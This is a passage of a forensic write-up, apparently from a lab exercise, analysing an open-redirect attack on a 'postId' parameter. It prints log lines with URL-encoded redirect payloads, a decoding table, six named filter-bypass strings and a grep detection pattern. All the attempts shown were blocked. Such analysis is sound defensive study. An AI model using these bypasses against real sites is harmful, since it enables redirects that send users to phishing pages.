## Phase 2 — Exploitation

**Attacker IP:** `86.236.188.85`  
**Exploitation Start:** `27/Apr/2023 15:45:22`  
**Parameter Attacked:** `postId`

### What Happened
A new IP appeared and began injecting URL-encoded external domains into the `postId` parameter. Instead of sending a normal post ID like `postId=5`, the attacker sent encoded URLs pointing to external sites like Google and example.com, trying to trick the server into redirecting users there.

### Evidence from Log
```
86.236.188.85 - - [27/Apr/2023:15:45:22] "GET /post?postId=%2f%09%2fexample%2ecom" 400
86.236.188.85 - - [27/Apr/2023:15:45:22] "GET /post?postId=%2f%2f%5cexample%2ecom" 400
86.236.188.85 - - [27/Apr/2023:15:45:23] "GET /post?postId=%2f%2fgoogle%2ecom%2f%2f%2e%2e" 400
86.236.188.85 - - [27/Apr/2023:15:45:23] "GET /post?postId=https%3a%2f%2fgoogle%2ecom" 400
86.236.188.85 - - [27/Apr/2023:15:45:24] "GET /post?postId=%2f%2fwhitelisteddomain%2etld@google%2ecom" 400
```

### Decoding the Payloads
The attacker used URL encoding to hide the true nature of the requests:

| Encoded Character | Decoded | Purpose |
|-------------------|---------|---------|
| `%2f` | `/` | Forward slash |
| `%5c` | `\` | Backslash — bypass filter |
| `%09` | TAB | Tab character — bypass filter |
| `%2e` | `.` | Dot (used in domain names) |
| `%3a` | `:` | Colon (used in `https:`) |
| `%2e%2e` | `..` | Directory traversal up a level |

**Example decoded payload:**
```
/post?postId=%2f%2fgoogle%2ecom%2f%2f%2e%2e
              ↓ decoded ↓
/post?postId=//google.com//..
```

### Bypass Techniques Used
```bash
# 1. Double slash redirect
postId=%2f%2fgoogle%2ecom
# Decoded: //google.com

# 2. Backslash bypass
postId=%2f%5cgoogle%2ecom
# Decoded: /\google.com

# 3. Tab character bypass
postId=%2f%09%2fgoogle%2ecom
# Decoded: /[TAB]/google.com

# 4. @ trick — pretend to be whitelisted domain
postId=%2f%2fwhitelisteddomain%2etld@google%2ecom
# Decoded: //whitelisteddomain.tld@google.com
# Browser reads destination as google.com

# 5. Path traversal combined with redirect
postId=%2f%2fgoogle%2ecom%2f%2f%2e%2e
# Decoded: //google.com//..

# 6. Protocol confusion
postId=https%3a%2f%2fgoogle%2ecom%2f%2f%2e%2e
# Decoded: https://google.com//..
```

### Command Used to Detect Attack Lines
```bash
grep -E "postId=.*(https?|%2f%2f|%5c|%2e%2e|%09)" \
  /root/Desktop/QuestionFiles/Open-Redirection/access.log
```

### Server Response
All exploitation attempts returned **400 (Bad Request)** — the server's filter blocked every redirect attempt. The attack was active but ultimately unsuccessful.

